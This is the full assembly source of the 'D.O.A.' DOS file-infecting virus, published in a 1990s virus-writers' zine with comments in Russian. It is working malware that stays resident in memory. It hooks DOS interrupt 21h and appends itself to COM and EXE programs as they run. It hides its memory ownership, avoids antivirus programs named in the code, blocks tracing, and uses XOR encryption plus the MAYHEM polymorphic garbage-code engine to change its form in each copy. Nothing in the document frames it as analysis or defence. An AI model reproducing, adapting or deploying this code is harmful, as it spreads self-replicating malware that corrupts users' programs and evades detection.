; INFECTED VOICE 7. (C)1994-95, by STEALTH group WorldWide.
;                   Mail us:   Box 10, Kiev-148, fUcKRAINE
;
;┌────────────────────────────────────┐  
;│  THE   D.O.A. VIRUS   RCE-Mutant   │  EXCLUSIVE FOR THE "INFECTED VOICE".
;│  Using MAYHEM v1.1.                │  
 └────────────────────────────────────┘

; CONSTANTS AND MACROS
SMOV MACRO dst,src		; PUSH src \ POP dst
	IFIDN <SRC>,<&FS>
	      PUSHF
	ELSE
              PUSH SRC
	ENDIF
	IFIDN <DST>,<&FS>
	      POPF
	ELSE
	      POP  DST
	ENDIF
ENDM
SES MACRO dst,src		; MOV dst,src \ MOV dst+2,ES
	MOV DST,SRC
	MOV DST&[+2],ES
ENDM
SDS MACRO dst,src		;                         DS
	MOV DST,SRC
	MOV DST&[+2],DS
ENDM
SCS MACRO dst,src		;                         CS
	MOV DST,SRC
	MOV DST&[+2],CS
ENDM
CLT MACRO			; Clear Trace Flag
	PUSH AX
	SMOV AX,FS
	AND  AH,0FEH
	SMOV FS,AX
	POP  AX
ENDM
STT MACRO			; Set Trace Flag
	PUSH AX
	SMOV AX,FS
	OR   AH,01
	SMOV FS,AX
	POP  AX
ENDM
MOVA MACRO dst,src	
	MOV AX,src
	MOV dst,AX
ENDM
PUSHALL MACRO
	PUSH AX CX DX BX BP SI DI DS ES
ENDM
POPALL MACRO
	POP ES DS DI SI BP BX DX CX AX
ENDM

  @PUSHF    EQU 9Ch	 ; Некоторые комманды процессора
  @POPF	    EQU 9Dh
  @IRET     EQU 0CFH
  @PFX_CS   EQU 2Eh
  @MOV_DL   EQU 0B2H

  PSPMemTop EQU 0002     ; Вершина доступной памяти
; ───────────────────────────────────────────────────────────────────────────
; LOCAL CONSTANTS AND MACROS
  VIRPARAS  EQU 200h	 ; 8Кб- размер занятой вирусом памяти
  STACKLEN  EQU 100h     ; предполагается для стека при проверке COM на >64К
 
; ───────────────────────────────────────────────────────────────────────────
.MODEL TINY
.CODE
 ORG 100H
 START0:
	JMP INIT			   ; JMP на вирус
 START:
        CALL $+3                	   ; Определим смещение начала вируса
	POP  SI
	SUB  SI,3
	MOV  CS:[SI][SISAVE-START],SI

        MOV AX,0F0EBh		   	   ; Есть ли мы в памяти ?
	INT 21H
	AFTERCHECK:		  ; Возврат сюда только, если вируса нет в 
				  ; памяти. Иначе IRET из 0F0EBh перейдет
				  ; на CUREINRAM

      	         ; Посадка в память: Этап 1.
		 ; Переносим тело за 3000h до MemTop - там его никто не затрет
                 ; Блок не выделяем.

        MOV AX,DS:[PSPMemTop]
        SUB AX,0300H             
                                  ; Перехватываем адрес завершения в PSP
				  ; для второго этапа инсталляции.
        LES  BX,DWORD PTR DS:[000AH]
	SES  CS:[SI][OLD22-START],BX
	MOV  WORD PTR DS:[000AH],MY22-START
	MOV  DS:[000CH],AX

	PUSH DS			  ; переносим тело
	SMOV DS,CS

        MOV  ES,AX              
	XOR  DI,DI
	PUSH SI
	MOV  CX,(INIT-START)/2
	CLD
	REP MOVSW

	POP  SI DS
					; Готовим стек для RETF 
        PUSH CS                   	
	MOV  AX,OFFSET CUREINRAM-START
	ADD  AX,SI			; Адрес CUREINRAM
	PUSH AX
					
	RETF


   MY22:		     ; Программа завершилась. Мы получили управление.

	MOV  AH,48H	     ; Отгрызаем 8 Kb.
	MOV  BX,0201H
	INT  21H	     
			; Скроем настоящих родителей нашего bastard'a.
			; Теперь папа "золотого ребенка" - MS-DOS. Он молчит.
			; Ему стыдно об этом даже на карте памяти написать!
	PUSH AX		
	MOV  AH,52H
	INT  21H		
	MOV  BX,ES:[BX-2]		; Первый MCB
	INC  BX
	POP  AX

	MOV  ES,AX

	DEC  AX
	MOV  DS,AX
        MOV  WORD PTR DS:[0001],BX	; Владелец вируса - блок с MCB No.1

	SMOV DS,CS
					; На постоянную квартиру - в законно
					; выделенный блок. С вещами.
	XOR  SI,SI
	XOR  DI,DI
	MOV  CX,(INIT-START)/2+2
	CLD
	REP  MOVSW			; переносимся...
					; Перехватываем INT 21h. Не делайте 
					; так. Лучше трассировка и сплайсинг.
	XOR  AX,AX
	MOV  DS,AX
	PUSH DS
	LDS  AX,DWORD PTR DS:[21H*4]
	MOV  ES:[OLDINT21-START],AX
	MOV  ES:[OLDINT21+2-START],DS
	POP  DS
	MOV  WORD PTR DS:[21H*4],OFFSET VIR21-START
	MOV  DS:[21H*4+2],ES

	DB 0EAH				; на оригинальный обработчик INT 22h
	OLD22 DW ?,?

CUREINRAM:			  ; Вирус все сделал. Восстановим программу
				  ; и передадим ей управление.
	SISAVE EQU $+1
        MOV  SI,0000	          ; Адрес начала вируса - см.в начале
        SMOV ES,DS

      DIRECTOR:
	JMP SHORT CUREASCOM	  ; Вместо флагов и проверок при заражении
				  ; меняем операнд JMP'а - на восстановление
				  ; EXE или же COM.

CUREASCOM:			  ; возврат 3-х байт 
	   CLD 
	   MOV DI,0100H

	   MOV AX,CS:[SI][ORIG_3-START]
	   STOSW
	   MOV AL,CS:[SI][ORIG_3+2-START]
	   STOSB

	   XOR  AX,AX		   ; 
	   PUSH AX		   ; Теперь нас не заботит, равно ли SP 0FFFEh
				   ; Наверху в стеке будет 0, что и нужно COM.
	   INC  AH		
	   JMP  AX		   ; Готово!

	   ORIG_3 DB 90H,0CDH,20H  ; Байтики настоящего начала

CUREASEXE:			   ; Восстанавливаем CS:IP и SS:SP для EXE

	MOV AX,DS
	ADD AX,10H		   ;  0000:0000=(PSP+10):0000

	ADD CS:[SI][OldCS-START],AX	; настройка CS,SS
	ADD CS:[SI][OldSS-START],AX	 
	CLI
	JMP SHORT $+2		   ; для сброса конвейера (т.к. меняем комман-
				   ; ды в пределах 16 байт)
	OLDSP EQU $+1
	MOV SP,0000
	OLDSS EQU $+1
	MOV AX,0000
	MOV SS,AX
	STI
	db 0EAh			   ; переход на EntryPoint EXE-шника
OLDIP   dw 0000
OLDCS   dw 0000

	; ОБРАБОТЧИК INT 21h -----------------------------------------------
VIR21: 
			; Антитрассировочный прием AVPTSR'а. Поставить сюда
			; его легче, чем кому-то потом обходить.
	PUSH AX				
	PUSHF
	POP AX
	TEST AH,01
	POP AX
	JZ NO_TRACE	
	STC 		; Если трассируют, то сразу IRET
	RETF 0002
	NO_TRACE:
	
	XCHG AX,BX	; Для любителей смотреть на "CMP AX,4B00h"
	ADD  BH,01DH
	CMP  BX,00DEBH	; ...и на вирусные функции (0F0EBh) проверки себя
	JNE  NXTFNC

	POP  AX				; Без пересадки летим на CureInRAM.
	ADD  AX,CUREINRAM-AFTERCHECK
	PUSH AX
	IRET

     NXTFNC:				
	CMP BX,4B00H+1D00H		
	JE  EXECIT
	SUB BH,1DH			
	XCHG AX,BX
	JMP JMPOLDDOS
     EXECIT:			; ---------- Обработка функции Exec (4B00h)
	SUB BH,1DH
	XCHG AX,BX
	PUSHALL
         			        ; Проверка доступа к файлу
	PUSH DX SI DS ES 		

	SMOV ES,CS

        MOV SI,DX	 	        ; Получить букву диска
	XOR DH,DH
	MOV DL,DS:[SI]

	AND DL,0DFH	                ; UpperCase
        SUB DL,41H
	MOV CS:[CURRDISK-START],DL

	POP ES DS SI DX 
ENDTESTACCESS:

					; Не тронь говна - вонять не будет.
	PUSH AX CX ES			
	SMOV ES,DS

	MOV  DI,DX			; Находим имя файла из PATHNAME
	MOV  CL,0FFH
	XOR  AL,AL
	REPNE SCASB
	STD
	MOV AL,'\'
	REPNE SCASB
	CLD
	MOV AX,ES:[DI][0002]
	POP ES CX

	CMP AX,'EW'		; WEB   
	JE  TABOOIS 
	CMP AX,'DA'		; ADinf
	JE  TABOOIS
	CMP AX,'IA'		; AIdstest немощный
	JE  TABOOIS
	CMP AX,'OC'		; COMMAND.COM непригоден для посадки с него 
	JE  TABOOIS		;             в память
	CMP AX,'RD'             ; DRweb тугодумный, деградирующий в Aidstest
	JE  TABOOIS
	CMP AX,'VA'		; AVP. Ужасно медленный WEBообразный
	JE  TABOOIS
	CMP AX,'BT'		; TBAV: Пиздун-громовержец. Эвристико-фаг.
	JE  TABOOIS		
	CMP AX,'HC'		; CHkdsk просто виснет наглухо. Не трогайте.	
    TABOOIS:
	POP AX
	JNE ENDTABOO
	JMP EXECEXIT
ENDTABOO:			
				; Открываем файл для чтения
	MOV  AX,3D00H		
	CALL CALLDOS
	JNC  MMM1
	JMP  CLOSEPOPEXIT

MMM1:
	CMP BYTE PTR CS:[CURRDISK-START],2
	JNB PROTABS
	
	PUSH AX CX DX		;  Проверяем презерватив на дискете.
	MOV DX,3F5H
	MOV AL,4
	OUT DX,AL
	MOV CX,400H
	LOOP $
	MOV AL,4
	OUT DX,AL
	MOV CH,4
	LOOP $
	IN  AL,DX
	TEST AL,40H
	POP DX CX AX
	JZ PROTABS		; ZF=Дискета без презерватива. Душман каюк!
	JMP CLOSEPOPEXIT

     PROTABS:			

	XCHG AX,BX			
	SMOV DS,CS

	PUSH BX ES DI		; Сменим режим открытия через SFT
	MOV  AX,1220H
	PUSH AX
	INT  2FH
	MOV  BL,ES:[DI]
	POP  AX
	SUB  AL,0AH
	INT  2FH
	MOV  WORD PTR ES:[DI][0002],0002

	MOV AX,ES:[DI][0Dh]		; сохраним дату и время файла
	MOV CS:[FTIME-START],AX
	MOV AX,ES:[DI][0Fh]
	MOV CS:[FDATE-START],AX

	POP DI ES BX

█  SelfInfTest:				; самопроверка на зараженность

	MOV AX,4202h
	MOV CX,-1
	MOV DX,-3
	CALL CALLDOS

	MOV AH,3Fh			; читаем 3 байта в конце
	MOV CX,0003
	PUSH CX
	MOV DX,ORIGINAL-START
	CALL CALLDOS
	POP CX
	JC TEE

	CMP AX,CX			
	JNZ TEE

	CMP CS:[ORIGINAL-START],'OD'		; DOA в конце файла
	JE TEE			
█ EndInfTest:		

SetDirector:
	MOV BYTE PTR DS:[DIRECTOR+1-START],00		; "JMP CUREASCOM"
GetOriginal:
	CALL FSEEK0

	MOV AH,3FH				 ; чтение заголовка файла
	MOV CX,18H
	PUSH CX
	MOV DX,ORIGINAL-START
	CALL CALLDOS
	XCHG DX,SI
	POP CX
	JC TEE

	SUB CX,AX
	JZ WHATTYPE
TEE:	JMP EXECEXIT

WHATTYPE:					; EXE или нет (COM) ?
	CMP [SI],'ZM'		
	JE  EXEisIT
	CMP [SI],'MZ'
	JE  EXEISIT

███ COMISIT:					; обработка COM

	MOV DX,DS:[ORIGINAL-START]		; сохранить 3 первых байта
	MOV DS:[ORIG_3-START],DX
	MOV DL,DS:[ORIGINAL-START+2]
	MOV DS:[ORIG_3+2-START],DL

	CALL FSEEK2
LENTEST:
	MOV DS:[JMPERARG-START],AX		; не короче своего размера
	CMP AX,ENDALL-START 	
	JB  TEE3
mmm323:	add ax,100h				; не длиннее...
	MOV DS:[VARSRC-START],AX      ; EntryPoint нового экземпл.(для MAYHEM)
	ADD AX,ENDALL-START+STACKLEN		; ... 64K-Стек-Тело
	JC TEE3

	ADD WORD PTR DS:[JmpERarg-Start],Init-Start-3	; JMP на тело

	CALL WRITETAIL
	JC TEE3

	call FSeek0			; пишем новое начало
	mov ah,40h
	mov cx,3
	push cx
	mov dx,offset JmpER-Start
	CALL CALLDOS
	pop cx
	jc tEE3

	JMP NEWGENERATION
TEE3:	JMP EXECEXIT
;----

███ EXEisIT:				; Обработка EXEшников.

IsWinEXE:		; А не форточкин ли это "новый ехе"?
			; Это не правило, но по смещению 0400h у них "NE"
	push si

	mov ax,4200h
	xor cx,cx
	mov dx,0400h
	call CallDOS
	
	mov ah,3Fh
	mov cx,0002
	mov dx,Offs400-Start
	call CallDOS
	jnc  m232
	pop si
	jmp WinTstExit	
m232:	xchg dx,si
	cmp  [si],'EN'
	pop  si
	je  tEE4		; ExecExit
WinTstExit:

SaveHDR:			; для восстановления сохраним CS:IP,SS:SP
	mov ax,[si+0Eh]
	mov ds:[OldSS-Start],ax
	mov ax,[si+10h]
	mov ds:[OldSP-Start],ax
	mov ax,[si+14h]
	mov ds:[OldIP-Start],ax
	mov ax,[si+16h]
	mov ds:[OldCS-Start],ax

NewEP:
	call FSeek2		; Возврат: DX:AX=длина файла
				
	push ax			; получаем число 512б. блоков из длины файла
	push dx			
	div word ptr ds:[MUL200-Start]
	or dx,dx
	jz NoInc		
	inc ax
   NoInc:
	cmp ax,[si+4]		; сравниваем число блоков с заголовочным
	pop dx
	pop ax
	ja tEE4			; на самом деле больше- файл сегментированный,
				; при заражении будет испорчен - не трогаем.

   GoodEXE:					; Подходящий файл.

	DIV WORD PTR DS:[MUL10-START]		; Параграфов в файле
	SUB AX,[SI+08]				; минус параграфов заголовка
	MOV DS:[VARSRC-START],DX		; Сохраним для MAYHEM: начало
	ADD DX,INIT-START			; + смещ. начала расшифровщика
	MOV [SI+14H],DX			; IP		
	ADD DX,ENDALL-INIT+2048d	
	mov [si+10h],dx			; SP
	mov [si+16h],ax			; CS
	add ax,100h			; ThunderByte замечает SS=CS.
	mov [si+0Eh],ax			; SS

SetDirectorEXE:
	MOV BYTE PTR DS:[DIRECTOR+1-START],CUREASEXE-DIRECTOR-2	 ;  CureAsEXE

	call WriteTail			; шифруем и пишем хвост	
	jnc SETSIZE
tEE4:	jmp ExecExit

SETSIZE:		; из-за переменного инсталлятора изменился размер
			; надо подкорректировать заголовок
	CALL FSEEK2	; заносим реальную длину в заголовок
	DIV  WORD PTR DS:[MUL200-START]
	OR   DX,DX
	JZ   NOINCNOW
	INC  AX
    NOINCNOW:
	MOV SI,OFFSET ORIGINAL-START
	MOV DS:[SI+4],AX
	MOV DS:[SI+2],DX
WriteHea:				; пишем заголовок
	CALL FSeek0

	MOV AH,40h
	MOV DX,ORIGINAL-START
	MOV CX,0018H
	CALL CALLDOS

  NEWGENERATION:
	INC WORD PTR DS:[GENCNT-START]		; счетчик поколений

███ ExecExit:				; время и дату - назад
	mov ax,5701h
	FDATE EQU $+1
	MOV DX,0000
	FTIME EQU $+1
	MOV CX,0000
	CALL CALLDOS

CLOSEPOPEXIT:	
	mov ah,3Eh
	CALL CALLDOS

OnlyPOP:

	POPALL					
	JMP JMPOLDDOS

JmpER    db 0E9h
JmpERarg dw 0000

JMPOLDDOS:
	 db 0EAh
OldInt21 dw 0000
	 dw 0000
MUL200   dw 0200h
MUL10    dw 0010h
GenCnt   dw 0001

█ WRITETAIL:			; шифрование вируса и допись тела к файлу
        CALL CRYPTMASTER	; шифруем

	MOV  ES:[DI],'OD'		; признак зараженности
	MOV  BYTE PTR ES:[DI+2],'A'
	ADD  DI,3

	SUB  DI,(OFFSET BODYPREPARE-START)
	PUSH DI

	CALL FSEEK2
				; дописываем вирус к файлу
	POP  CX		
	MOV  AH,40H
	MOV  DX,BODYPREPARE-START 	
	CALL CALLDOS
	
	MOV AH,68H		; Flush buffers для нахождения НОВОЙ длины
	CALL CALLDOS		; файла по FSeek (4202h)

	RETN

█  FSeek2:
	mov ax,4202h
	jmp short Zero0110
█  FSeek0:
	mov ax,4200h
█  Zero0110:
	xor cx,cx
	xor dx,dx
███ CALLDOS:
	pushf
	call dword ptr CS:[offset OldInt21-Start]
	retn
;----------------------------------------------------------------------
CRYPTMASTER:

       PUSH BX					; File Handle

       SMOV ES,DS
       XOR  SI,SI
       MOV  DI,OFFSET BODYPREPARE-START
       MOV  CX,(OFFSET INIT-START)/2
       CLD
       REP  MOVSW
				     
       CALL RNDW		      ; ключ для XOR
       MOV  DS:[VARXOR-START],DX      ; Для MAYHEM

       PUSH DX			      
       CALL RNDW	
       MOV  AX,DX
       POP  DX

       MOV  DS:[VARDIS-START],AX

       MOV SI,BODYPREPARE-START       ; шифруем по XOR
       MOV CX,(Init-Start)/2
mXOR:  XOR [SI],DX
       ADD DX,AX
       INC SI
       INC SI
       LOOP mXOR

;----------------------------------- Приготовления к запуску MAYHEM ---------
RunMayhem: 
      		
				 ; Занесем в стек адрес для возврата из MAYHEM
       PUSH DS:[VARSRC-START]   	
       POP  DS:[VARRETF-START]	
       PUSH CS			       
       MOV  AX,AFTERMAYHEM-START         
       PUSH AX
				 ; Занесем в стек адрес для перехода в MAYHEM
       MOV  AX,DS                       
       ADD  AX,(MAYHEM-START)/10h  ; всегда выровнена на параграф
       MOV  DS,AX		   ; Требуется: DS=CS 
       PUSH AX			   ; Старт:     CS:0000
       XOR  AX,AX
       PUSH AX

       MOV DI,THEENDATALL-START		; Место назначения
       MOV CS:[DSTADDR-START],DI	; Для MAYHEM

       RETF				; вызов MAYHEM
AfterMayhem:
       SMOV DS,CS			; выход из MAYHEM

       POP BX				; FileHandle- сохранен в начале проц.
       RETN
;─────────────────────────────────────────────────────────────────────────────
; Процедуры ──────────────────────────────────────────────────────────────────

RNDW PROC				; Результат: DX=RND(0..FFFF)
       IN  AL,40H
       MOV DH,AL
       IN  AL,40H
       MOV DL,AL
       RETN
RNDW ENDP

;============================================================================
;------ Константы для MAYHEM ------------------------------------------------

	RECSIZE     equ	 8	; TABLE RECORD STRUCTURE
	ADDRESS     equ  0
	PLACE       equ  2
	DISTANCE    equ  3
	REALPLACE   equ  4
	R_GROUP     equ  5
	OPERAND     equ  6

	R_AX	equ  0		; REGISTER NUMBERS AS IN INSTRUCTIONS
	R_CX	equ  1
	R_DX    equ  2
	R_BX    equ  3
	R_SP    equ  4
	R_BP    equ  5
	R_SI    equ  6
	R_DI    equ  7



 HOLLOW DB 16-((HOLLOW-START) MOD 16) DUP(90h)    ; Выравнивание до параграфа

; --------------------------------- ; ТОЧКА ВХОДА ; ------------------------
					          ; CS=DS, ES:DI=Destination
						  ; IP=0.
 MAYHEM:
	PUSH DI					  ; Адрес назначения
	MOV BYTE PTR DS:[R_USED-MAYHEM],00010000B ; Исключаем SP
       ;-----------------------------------------   Находим регистры для групп
	MOV SI,R_MASK-MAYHEM	 	   	  ; Адрес масок для групп
	MOV DI,R_GRP -MAYHEM                      ; Результат

    C1:	CMP BYTE PTR [SI],00			  ; Конец масок ?
	JZ  ENDFORM
						  ; Номер регистра
	MOV  DL,7				  ; RND(0..7) 
	CALL RND

	MOV CL,DL				  ; Представим в виде бита
	MOV AL,1                                  
	SHL AL,CL

   TSTUSED:
	TEST BYTE PTR DS:[R_USED-MAYHEM],AL	  ; Не занят другими ?
	JZ SUITTST
    TSTROL:					  ; От RND нужного сто лет
	INC DL	      				  ; не дождешься. Берем следу-
	ROL AL,1  				  ; ющий по счету регистр и...
	CMP DL,8       	        		
	JB TSTUSED
	XOR DL,DL				  ; дошли до края и - сначала
	JMP TSTUSED				  ; подразумевается, что один
						  ; свободный все-таки будет
    SUITTST:
	TEST BYTE PTR [SI],AL			  ; Никем не занят. А нам он
	JZ   TSTROL				  ; нужен такой ?

	MOV DS:[DI],DL				  ; Нашли регистр для группы
	OR  DS:[R_USED-MAYHEM],AL		  ; помечаем как занятый
	INC DI				
	INC SI
	JMP C1					  ; для следующей группы...	
    ENDFORM:

       ;------------------------------------  Каждому command'у - свое (место)
	MOV SI,MUTAB-MAYHEM	 	    ; Даза банных, где парится MAYHEM
    					    ; сканируем запись за записью 
   C2:	MOV  DL,[SI][DISTANCE]		    ; поле "разброс номера позиции"
	CALL RND			    ; Комманда отстоит на RND(0..Dist)
	ADD  DL,[SI][PLACE]		    ; ...от своего места
	MOV  [SI][REALPLACE],DL		    ; позиция комм. в формируемом коде
	ADD  SI,RECSIZE			    ; следующая запись 	
	CMP  WORD PTR [SI],0000		    ; конец записей ? 
	JNZ  C2

       ;--------------------------------  Приготовления закончены. Теперь
	                                ; соберем все и тогда начнется mayhem!

	POP DI  			; кто забыл ES:DI = МестоНазначения
	MOV AL,-1			; Счетчик позиций 
    
NXTNMB:	INC AL				    ; Следующая позиция 
	CMP AL,(ENDMUTAB-MUTAB)/RECSIZE-1   ; Все позиции размещены ?
	JA  EXITALLOC
					; Сканируем базу на предмет комманд с
	MOV SI,MUTAB-RECSIZE-MAYHEM	; позицией REALPLACE=AL
    NXTELEM:
	ADD SI,RECSIZE			; след. запись
	CMP WORD PTR [SI],0000		
	JE  NXTNMB                      ; конец базы? 

	CMP [SI][REALPLACE],AL	        ; совпали позиции ?
	JNE NXTELEM
					; ДОБАВЛЯЕМ КОММАНДУ + мусор
	PUSH AX			
	CALL DS:[SI]			; адрес процедуры для ДАННОЙ комманды
        CALL TRASHCHAIN                 ; генерируем цепочку мусора
        POP  AX
	JMP NXTELEM
EXITALLOC:
	JMP MAYHEM_OFF
;----------------------------------------------------------------------------
;---------------------------------------  Служебные процедуры MAYHEM  -------

    RND PROC			; DL= RND (0..DL)  Получить случайный байт
				; Обнуляет DH на выходе.
	PUSH AX CX BX			

	OR DL,DL		; RND(0..0)=0
	JZ EXRND

	INC DL			; для 0FFh не надо +1
	JNZ OKK			
	DEC DL
     OKK:
	MOV AX,0100H		; размер единичного отрезка
	DIV DL
	NOT AH			

	XCHG AL,DL		
	IN   AL,40H
	CMP  AL,AH		; Если RND больше, чем ЕдОтр*ВерхГран,
	JBE  OKK1		; то обрезаем до EдOтр*ВерхГран
	MOV  AL,AH
	OKK1:

	XOR AH,AH		; Делим полученный RND-байт на Единичн.Отрезок
	DIV DL
	MOV DL,AL
	XOR DH,DH		

	EXRND:
	POP BX CX AX
	RETN
    RND ENDP

;---------------------------------------------------------------------------
   TRASH PROC	; Добавляет к цепочке случайную комманду
		; По R_USED определяет незанятые регистры
		; ES:DI=место назначения
					
	PUSH AX SI
					; получим адрес одной из таблиц слу-
					; чайных комманд из T_CHAIN
	MOV  SI,T_CHAIN-MAYHEM		
	MOV  DL,(END_T_CHAIN-T_CHAIN)/2-1	; RND номер элемента T_CHAIN
	CALL RND
	SHL  DL,1			; *2_Байта	
	ADD  SI,DX			; [SI]  Здесь адрес одной из таблиц
	MOV  SI,[SI]			; Вот он

				  ; Берем случайную комманду из выбранной
				  ; таблицы. Таблица имеет заголовок:
				  ; кол-во комманд (CMDNUMB), размер комманды
				  ; в таблице(CMDSIZE) и CMDSTAT -байт статуса
	MOV DL,[si][CMDNUMB]	    	
	call RND		  
	mov al,[si][CMDSIZE]
	mul dl
	mov cl,[si][CMDSTAT]
	add si,ax			; SI=Адрес найденной нами комманды
					; CL=байт статуса комманды
	add si,3			; SI=SI+3 (заголовок таблицы)

				; Теперь строим случайную комманду на основа-
				; нии байта статуса комманд этой таблицы

	test cl,CMD	        ; Комманда начинается с постоянного байта ?
	jz   end_cmd
	CLD			; Добавляем в цепочку байт из DS:[SI]
	MOVSB
	end_cmd:

	test cl,CMDPLUS		; Добавить байт + номер регистра ?
	jz  end_cmdplus

	mov dl,7
	call RND		; Получаем номер регистра и проверяем его на
	test cl,REGCHNG		; занятость... 
	jz end_suitreg

	push cx
	mov  cl,dl
	mov  al,1
	shl  al,cl

   cont_tst:
	test ds:[offset R_USED-MAYHEM],AL
	jz pop_end_suitreg

	inc dl
	rol al,1
	cmp dl,8
	jb  cont_tst
	xor dl,dl
	jmp cont_tst

     pop_end_suitreg:
	pop cx
	end_suitreg:

	TEST CL,PLUS8		; Нужно ли номер регистра множить на 8 ?
	JZ ADD1
      ADD8:		
	PUSH AX
	MOV AL,8
	MUL DL
	MOV DL,AL
	POP AX
      ADD1:
	add dl,[si]
	mov es:[di],dl
	inc di
	end_cmdplus:

	test cl,RNDNUMB		; Нужно ли комманде случайное слово ?
	jz end_addrnd
	mov dl,0FFh
	call RND
	mov al,dl
	mov dl,0FFh
	call RND
	mov dh,al
	mov es:[di],dx
	inc di
	inc di
	end_addrnd:
	pop si ax
	retn
			
       ;-------------------------------------------------------------------
	t_chain       dw offset TAB0-MAYHEM	; Адреса таблиц RND комманд
		      dw offset TAB1-MAYHEM
		      dw offset TAB2-MAYHEM
		      dw offset TAB3-MAYHEM
		      dw offset TAB4-MAYHEM
		      dw offset TAB5-MAYHEM
	end_t_chain   dw 0000

       ;-------------------------------------------------------------------
       ;Константы:        
	CMDHDR  equ 3		; Длина заголовка таблицы		
			        ; Смещения полей таблицы
	CMDNUMB equ 0		;       Количество комманд
	CMDSIZE equ 1		;       Размер комманды в таблице
	CMDSTAT equ 2		;       Байт статуса

					; Формат байта статуса: 	
	CMD	equ 00000001b		; CONST_BYTE
	CMDPLUS equ 00000010b		; CONST_BYTE + REG_NO
	PLUS8   EQU 00000100B		; CONST_BYTE + REG_NO*8
	RNDNUMB equ 00001000b		; + RND_WORD 
	REGCHNG equ 10000000b		; меняет значения регистров
	PFXSEG  equ 01000000b		; можно добавлять префикс сегмента

			;---------------- ТАБЛИЦЫ КОММАНД ----------------

	tab0	db (endtab0-cmds0)/01-1		; количество комманд
		db 01				; размер элемента таблицы
		db CMD				; байт статуса
	cmds0:					; сами комманды
		cld				
		sti
		nop
	endtab0:
	;-------------------------------------------------
	tab1	db (endtab1-cmds1)/01-1
		db 01
		db CMDPLUS+REGCHNG+PFXSEG
	cmds1:
		inc ax
		dec ax
	endtab1:
	;-------------------------------------------------
	tab2	db (ENDTAB2-cmds2)/2-1
		db 02
		db CMD+CMDPLUS+REGCHNG+PFXSEG
	cmds2:
		neg ax
		not ax
		rol ax,1
		ror ax,1
		rcr ax,1
		rcl ax,1
		shl ax,1
		shr ax,1
	endtab2:
	;-------------------------------------------------

	tab3	db (ENDTAB3-cmds3)/1-1
		db 1
		db CMDPLUS+RNDNUMB+REGCHNG+PFXSEG
	cmds3:
		db 0B8h		; mov ax
	endtab3:
	;-------------------------------------------------

	tab4	db (ENDTAB4-cmds4)/2-1
		db 2
		db CMD+CMDPLUS+RNDNUMB+PFXSEG+REGCHNG
	cmds4:
		db 81h,0F0h	; xor reg,imm
		db 81h,0E8h	; sub reg,imm
		db 81h,0c0h	; add reg,imm
		db 81h,0e0h	; and reg,imm
		db 81h,0c8h	; or  reg,imm
		db 81h,0d0h	; adc reg,imm
		db 81h,0d8h	; sbb reg,imm
	endtab4:
	;-------------------------------------------------

	TAB5    DB (ENDTAB5-CMDS5)/2-1
		DB 2
		DB CMD+CMDPLUS+PLUS8+RNDNUMB+PFXSEG+REGCHNG
	CMDS5:
		DB 8BH,06H	; MOV REG,MEM
		DB 03H,06H      ; ADD REG,MEM
	ENDTAB5:
	;-------------------------------------------------

   ;	PFXTAB  DB 26h,2eh,36h,3eh		; префиксы сегментов

	TRASH ENDP
   ;-----------------------------------------------------------------------
    TRASHCHAIN PROC		; Добавляет к коду цепочку случайных комманд
	PUSH CX DX
	MOV  DL,08
	CALL RND
	XOR  DH,DH
	INC  DL
	MOV  CX,DX
mm1:	PUSH CX
        CALL ARTRASH            ; Одна процедура генерации мусора
	CALL TRASH		; Другая процедура генерации мусора
	POP CX
	LOOP MM1
	POP DX CX
        RETN
    TRASHCHAIN ENDP

;--- Процедура генерации арифметического мусора с байтовыми регистрами
;    Комманды:  MOV ADD ADC SUB SBB XOR TEST
;    Вид :      CONST+
;               (REG*8+RND(0..7))*(RND(0..3)*40h) +
;               [RNDbyte/RNDword/nothing]
;    Зависимость от 2го байта: 	  06+RND(0..7)*8  :  +WORD       
;                                 00..3F  другие  :  ничего   
;                                 40..7F          :  +BYTE        
;                                 80..BF          :  +WORD
;                                 C0..FF          :  ничего
;    Советую посмотреть комманды самим в HIEW etc.

ARTRASH PROC

        PUSH AX CX DX SI
	
	MOV CL,DS:[R_USED-MAYHEM]      ; Ести все из AX,CX,DX,BX заняты,-EXIT.
	AND CL,0FH
	CMP CL,0FH
	JE  NO_ADD

        MOV  SI,CMDS-MAYHEM	       ; Первые байты комманд
	MOV  DL,CMDSEND-CMDS-1	       ; Случайная комманда в пределах 
        CALL RND
	XOR  DH,DH
	ADD  SI,DX
	CLD			       ; заносим ее в цепочку
	LODSB			
        STOSB

        CALL GETFREEREG		       ; получаем свободный полурегистр
					
        MOV  AL,8
        MUL  DL			       ; REG*8

	MOV  DL,7		       ; + RND(0..7)
        CALL RND
        ADD  AL,DL

	PUSH AX			       ; + RND(0..3)*40H
	MOV  DL,3
	CALL RND
        MOV  AL,40H
	MUL  DL
	POP  DX
	ADD  AL,DL

        STOSB				; второй байт Done.
					; Нужны ли RND в конце комманды ?
	CMP  AL,06
	JE   ADD_W
	CMP  AL,0EH
	JE ADD_W
	CMP  AL,16H
	JE ADD_W
	CMP AL,1EH
	JE ADD_W
	CMP AL,26H
	JE ADD_W
	CMP AL,2EH
	JE ADD_W
	CMP AL,36H
	JE ADD_W
	CMP AL,3EH
	JE ADD_W
	CMP  AL,40H
	JB NO_ADD

        CMP  AL,80H
        JB   ADD_B
        CMP  AL,0C0H
        JAE  NO_ADD
    ADD_W:				; добавить случайное слово
        MOV DL,0FFH			
        CALL RND
	MOV AL,DL
        STOSB
    ADD_B:				; добавить случайный байт
        MOV DL,0FFH
        CALL RND
	MOV AL,DL
        STOSB
    NO_ADD:				; ничего не добавлять
        POP SI DX CX AX
        RETN
;--------------------------------------
CMDS    DB 8AH,32H,02H,1AH,12H,2AH,84H		; комманды
;          MOV XOR ADD SBB ADC SUB TEST
CMDSEND:
ARTRASH ENDP
;-----------------------------------------------------------------------
GETFREEREG PROC                      ; Возвращает номер свободного байтного
                                     ; регистра :  AL=Бит , DL=Номер
        MOV  DL,7
        CALL RND
        MOV  AL,1		     ; в виде бита
	MOV  CL,DL
        SHL  AL,CL
                                     ;                         BhChBlCl 
				     ; байт                    | | | |
	MOV  DH,DS:[R_USED-MAYHEM]   ; для байтных регистров:  76543210
                                     ;                          | | | |
                                     ;                          DhAhDlAl  
	MOV  CH,DH		     ; копируем биты 0..3 в 4..7
	AND  CH,0FH
	MOV  CL,4
	SHL  DH,CL
	ADD  CH,DH
	
  CONTTST:

	TEST AL,CH		      ; подходит ? 		
        JZ   GFR_DONE

        INC DL			      ; нет - сдвигаем и ищем дальше 	
        ROL AL,1
        CMP DL,8
        JB CONTTST
        XOR DL,DL
        JMP CONTTST
   GFR_DONE:			
        RETN
GETFREEREG ENDP
